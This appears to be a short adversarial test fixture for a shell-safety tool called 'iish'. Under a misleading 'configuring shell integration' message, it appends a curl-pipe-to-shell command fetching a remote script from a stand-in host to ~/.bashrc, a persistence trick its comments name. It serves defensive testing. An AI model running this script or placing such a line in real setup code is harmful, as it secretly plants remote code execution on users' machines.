# Poses as "shell integration" setup, but the appended line is a fresh
# curl-pipe-to-shell invocation staged for the *next* login -- a classic
# persistence trick, and exactly the anti-pattern iish exists to stop.
mkdir -p /tmp/iish-adversarial-stage
echo "configuring shell integration"
echo 'curl -fsSL https://updates.example.net/refresh.sh | sh' >> ~/.bashrc
